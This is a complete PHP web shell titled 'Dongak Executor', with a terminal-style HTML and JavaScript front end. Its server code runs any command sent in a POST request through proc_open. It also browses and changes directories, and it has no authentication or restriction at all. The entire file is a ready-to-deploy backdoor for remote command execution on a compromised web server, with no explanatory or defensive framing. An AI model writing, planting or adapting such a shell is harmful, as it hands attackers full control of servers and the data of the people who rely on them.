<?php
session_start();

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

function executeCommand($cmd) {
    $cwd = $_SESSION['cwd'];
    $descriptorspec = [
        0 => ["pipe", "r"],
        1 => ["pipe", "w"],
        2 => ["pipe", "w"]
    ];
    $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
    if (is_resource($process)) {
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        return ['stdout' => trim($stdout), 'stderr' => trim($stderr)];
    }
    return ['stdout' => '', 'stderr' => 'Failed to execute command'];
}

function listDirectory($path) {
    $items = [];
    if (is_dir($path) && $handle = opendir($path)) {
        while (($entry = readdir($handle)) !== false) {
            if ($entry === '.' || $entry === '..') continue;
            $fullPath = $path . DIRECTORY_SEPARATOR . $entry;
            $items[] = [
                'name' => $entry,
                'type' => is_dir($fullPath) ? 'dir' : 'file',
                'size' => is_file($fullPath) ? filesize($fullPath) : 0
            ];
        }
        closedir($handle);
        usort($items, function($a, $b) {
            if ($a['type'] === $b['type']) {
                return strcasecmp($a['name'], $b['name']);
            }
            return $a['type'] === 'dir' ? -1 : 1;
        });
    }
    return $items;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $response = ['success' => false, 'data' => '', 'cwd' => $_SESSION['cwd']];

    switch ($action) {
        case 'exec':
            $cmd = $_POST['cmd'] ?? '';
            if ($cmd) {
                $result = executeCommand($cmd);
                $output = '';
                if ($result['stdout']) $output .= $result['stdout'];
                if ($result['stderr']) $output .= ($output ? "\n" : '') . $result['stderr'];
                $response['data'] = $output ?: '(no output)';
                $response['success'] = true;
            }
            break;

        case 'cd':
            $dir = $_POST['dir'] ?? '';
            if ($dir) {
                $newPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $dir;
                $realPath = realpath($newPath);
                if ($realPath && is_dir($realPath)) {
                    $_SESSION['cwd'] = $realPath;
                    $response['cwd'] = $realPath;
                    $response['data'] = "Changed directory to: $realPath";
                    $response['success'] = true;
                } else {
                    $response['data'] = "Invalid directory: $dir";
                }
            }
            break;

        case 'list':
            $items = listDirectory($_SESSION['cwd']);
            $response['data'] = $items;
            $response['success'] = true;
            break;

        case 'init':
            $response['data'] = $_SESSION['cwd'];
            $response['success'] = true;
            break;
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dongak Executor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .shell-container {
            width: 100%;
            max-width: 1200px;
            height: 90vh;
            background: #111;
            border: 1px solid #2a2a2a;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .shell-header {
            background: #1a1a1a;
            padding: 12px 20px;
            border-bottom: 1px solid #2a2a2a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            flex-wrap: wrap;
            gap: 8px;
        }
        .shell-header .title {
            color: #00ff41;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 1px;
        }
        .shell-header .cwd-display {
            color: #888;
            font-size: 12px;
            background: #1f1f1f;
            padding: 4px 12px;
            border-radius: 4px;
            border: 1px solid #2a2a2a;
            max-width: 50%;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            cursor: pointer;
            transition: border-color 0.2s;
        }
        .shell-header .cwd-display:hover {
            border-color: #00ff41;
        }
        .shell-body {
            flex: 1;
            padding: 16px 20px;
            overflow-y: auto;
            background: #0d0d0d;
            display: flex;
            flex-direction: column;
            gap: 4px;
            scroll-behavior: smooth;
        }
        .shell-body::-webkit-scrollbar {
            width: 8px;
        }
        .shell-body::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        .shell-body::-webkit-scrollbar-thumb {
            background: #2a2a2a;
            border-radius: 4px;
        }
        .shell-body::-webkit-scrollbar-thumb:hover {
            background: #3a3a3a;
        }
        .output-line {
            color: #c0c0c0;
            font-size: 14px;
            line-height: 1.6;
            word-wrap: break-word;
            white-space: pre-wrap;
            padding: 1px 0;
        }
        .output-line.error {
            color: #ff6b6b;
        }
        .output-line.success {
            color: #51cf66;
        }
        .output-line.info {
            color: #4dabf7;
        }
        .output-line .prompt {
            color: #00ff41;
            font-weight: 600;
        }
        .output-line.clickable {
            cursor: pointer;
            color: #4dabf7;
            text-decoration: underline;
            text-decoration-style: dotted;
            transition: color 0.2s;
        }
        .output-line.clickable:hover {
            color: #74c0fc;
        }
        .input-line {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 4px;
            flex-shrink: 0;
        }
        .input-line .prompt-symbol {
            color: #00ff41;
            font-weight: 600;
            font-size: 14px;
            flex-shrink: 0;
        }
        .input-line input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
            padding: 4px 0;
            caret-color: #00ff41;
            min-width: 0;
        }
        .input-line input::selection {
            background: #1f3a2f;
        }
        .input-line input:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .shell-footer {
            background: #1a1a1a;
            padding: 8px 20px;
            border-top: 1px solid #2a2a2a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            font-size: 11px;
            color: #555;
            flex-wrap: wrap;
            gap: 8px;
        }
        .shell-footer .status {
            color: #00ff41;
        }
        .shell-footer .status.error {
            color: #ff6b6b;
        }
        .btn {
            background: #1f1f1f;
            border: 1px solid #2a2a2a;
            color: #aaa;
            padding: 4px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            transition: all 0.15s;
            user-select: none;
        }
        .btn:hover {
            background: #2a2a2a;
            color: #fff;
            border-color: #3a3a3a;
        }
        .btn.danger:hover {
            border-color: #ff6b6b;
            color: #ff6b6b;
        }
        .btn.primary {
            background: #1a3a2a;
            border-color: #00ff41;
            color: #00ff41;
        }
        .btn.primary:hover {
            background: #1f4a2f;
        }
        .btn-group {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .file-browser {
            background: #161616;
            border: 1px solid #2a2a2a;
            border-radius: 4px;
            padding: 8px 12px;
            margin-bottom: 8px;
            max-height: 200px;
            overflow-y: auto;
        }
        .file-browser::-webkit-scrollbar {
            width: 6px;
        }
        .file-browser::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        .file-browser::-webkit-scrollbar-thumb {
            background: #2a2a2a;
            border-radius: 4px;
        }
        .file-item {
            padding: 2px 4px;
            cursor: pointer;
            color: #888;
            font-size: 12px;
            transition: all 0.15s;
            border-radius: 2px;
        }
        .file-item:hover {
            background: #1f1f1f;
            color: #e0e0e0;
        }
        .file-item.dir {
            color: #4dabf7;
        }
        .file-item.dir:hover {
            color: #74c0fc;
        }
        .file-item.file {
            color: #c0c0c0;
        }
        .file-item.file:hover {
            color: #e0e0e0;
        }
        @media (max-width: 768px) {
            .shell-container {
                height: 95vh;
                border-radius: 4px;
            }
            .shell-header .cwd-display {
                max-width: 30%;
                font-size: 10px;
            }
            .shell-header .title {
                font-size: 12px;
            }
            .output-line {
                font-size: 12px;
            }
            .input-line input {
                font-size: 12px;
            }
            .shell-body {
                padding: 12px 14px;
            }
        }
    </style>
</head>
<body>
    <div class="shell-container">
        <div class="shell-header">
            <span class="title">⚡ Dongak Executor</span>
            <span class="cwd-display" id="cwdDisplay" title="Click to browse">/</span>
            <div class="btn-group">
                <button class="btn" id="refreshBtn">⟳ Refresh</button>
                <button class="btn danger" id="clearBtn">✕ Clear</button>
            </div>
        </div>
        <div class="shell-body" id="shellBody">
            <div class="file-browser" id="fileBrowser"></div>
            <div class="output-line info">
                <span class="prompt">➜</span> Dongak Executor v1.0
            </div>
            <div class="output-line info">
                <span class="prompt">➜</span> Type commands or click directories to navigate
            </div>
            <div class="output-line" id="initialCwd"></div>
        </div>
        <div class="input-line" style="padding: 0 20px 12px;">
            <span class="prompt-symbol">$</span>
            <input type="text" id="cmdInput" placeholder="Enter command..." autofocus>
        </div>
        <div class="shell-footer">
            <span class="status" id="statusIndicator">● Ready</span>
            <span id="footerCwd" style="color: #666; max-width: 40%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">/</span>
        </div>
    </div>
    <script>
        const shellBody = document.getElementById('shellBody');
        const cmdInput = document.getElementById('cmdInput');
        const cwdDisplay = document.getElementById('cwdDisplay');
        const footerCwd = document.getElementById('footerCwd');
        const statusIndicator = document.getElementById('statusIndicator');
        const fileBrowser = document.getElementById('fileBrowser');
        let currentCwd = '/';
        let commandHistory = [];
        let historyIndex = -1;

        function updateCwdDisplay(path) {
            currentCwd = path;
            const displayPath = path.length > 50 ? '...' + path.substring(path.length - 47) : path;
            cwdDisplay.textContent = displayPath;
            footerCwd.textContent = path;
        }

        function setStatus(text, isError = false) {
            statusIndicator.textContent = text;
            statusIndicator.className = 'status' + (isError ? ' error' : '');
        }

        function appendOutput(text, className = '') {
            const div = document.createElement('div');
            div.className = 'output-line' + (className ? ' ' + className : '');
            div.textContent = text;
            shellBody.insertBefore(div, fileBrowser.nextSibling);
            shellBody.scrollTop = shellBody.scrollHeight;
        }

        function appendClickableDir(name, fullPath) {
            const div = document.createElement('div');
            div.className = 'output-line clickable';
            div.textContent = '📁 ' + name + '/';
            div.title = 'Click to navigate to ' + fullPath;
            div.addEventListener('click', function() {
                navigateTo(fullPath);
            });
            shellBody.insertBefore(div, fileBrowser.nextSibling);
            shellBody.scrollTop = shellBody.scrollHeight;
        }

        function clearOutput() {
            const toRemove = [];
            let node = shellBody.firstChild;
            while (node) {
                if (node !== fileBrowser && node.id !== 'initialCwd' &&
                    !(node.classList && node.classList.contains('info') && node.textContent.includes('Dongak Executor'))) {
                    toRemove.push(node);
                }
                node = node.nextSibling;
            }
            toRemove.forEach(el => el.remove());
        }

        function navigateTo(path) {
            fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'action=cd&dir=' + encodeURIComponent(path)
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        updateCwdDisplay(data.cwd);
                        appendOutput('Changed to: ' + data.cwd, 'success');
                        loadDirectoryListing();
                        setStatus('✓ Directory changed');
                    } else {
                        appendOutput('Error: ' + data.data, 'error');
                        setStatus('✗ ' + data.data, true);
                    }
                })
                .catch(err => {
                    appendOutput('Request failed: ' + err, 'error');
                    setStatus('✗ Connection error', true);
                });
        }

        function loadDirectoryListing() {
            fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'action=list'
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success && Array.isArray(data.data)) {
                        fileBrowser.innerHTML = '';
                        data.data.forEach(item => {
                            const div = document.createElement('div');
                            div.className = 'file-item ' + item.type;
                            const icon = item.type === 'dir' ? '📁' : '📄';
                            const size = item.type === 'file' ? ' (' + formatSize(item.size) + ')' : '';
                            div.textContent = icon + ' ' + item.name + size;
                            if (item.type === 'dir') {
                                div.title = 'Click to enter directory';
                                div.addEventListener('click', function(e) {
                                    e.stopPropagation();
                                    navigateTo(item.name);
                                });
                            }
                            fileBrowser.appendChild(div);
                        });
                        fileBrowser.style.display = 'block';
                    }
                })
                .catch(err => {
                    console.error('Failed to load directory listing:', err);
                });
        }

        function formatSize(bytes) {
            if (bytes < 1024) return bytes + ' B';
            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
            if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
            return (bytes / 1073741824).toFixed(1) + ' GB';
        }

        function executeCommand(cmd) {
            if (!cmd.trim()) return;
            appendOutput('$ ' + cmd, '');
            cmdInput.disabled = true;
            setStatus('⏳ Executing...');

            fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'action=exec&cmd=' + encodeURIComponent(cmd)
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        const lines = data.data.split('\n');
                        lines.forEach(line => {
                            if (line.trim()) {
                                appendOutput(line);
                            }
                        });
                        if (data.cwd && data.cwd !== currentCwd) {
                            updateCwdDisplay(data.cwd);
                        }
                        setStatus('✓ Done');
                    } else {
                        appendOutput('Error: ' + data.data, 'error');
                        setStatus('✗ ' + data.data, true);
                    }
                    cmdInput.disabled = false;
                    cmdInput.focus();
                    shellBody.scrollTop = shellBody.scrollHeight;
                })
                .catch(err => {
                    appendOutput('Request failed: ' + err, 'error');
                    setStatus('✗ Connection error', true);
                    cmdInput.disabled = false;
                    cmdInput.focus();
                });
        }

        function initShell() {
            fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'action=init'
                })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        updateCwdDisplay(data.data);
                        const cwdLine = document.getElementById('initialCwd');
                        cwdLine.textContent = 'Current directory: ' + data.data;
                        cwdLine.className = 'output-line info';
                        loadDirectoryListing();
                        setStatus('● Ready');
                        cmdInput.focus();
                    }
                })
                .catch(err => {
                    appendOutput('Failed to initialize: ' + err, 'error');
                    setStatus('✗ Init failed', true);
                });
        }

        cmdInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const cmd = this.value;
                if (cmd.trim()) {
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                    executeCommand(cmd);
                    this.value = '';
                }
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    this.value = commandHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex] || '';
                } else {
                    historyIndex = commandHistory.length;
                    this.value = '';
                }
            }
        });

        cwdDisplay.addEventListener('click', function() {
            if (fileBrowser.style.display === 'none' || fileBrowser.style.display === '') {
                loadDirectoryListing();
                fileBrowser.style.display = 'block';
            } else {
                fileBrowser.style.display = 'none';
            }
        });

        document.getElementById('refreshBtn').addEventListener('click', function() {
            loadDirectoryListing();
            setStatus('⟳ Refreshed');
            setTimeout(() => setStatus('● Ready'), 1000);
        });

        document.getElementById('clearBtn').addEventListener('click', function() {
            clearOutput();
            setStatus('✕ Cleared');
            setTimeout(() => setStatus('● Ready'), 1000);
        });

        document.addEventListener('click', function(e) {
            if (!e.target.closest('.shell-container')) {
                cmdInput.focus();
            }
        });

        initShell();
    </script>
</body>
</html>
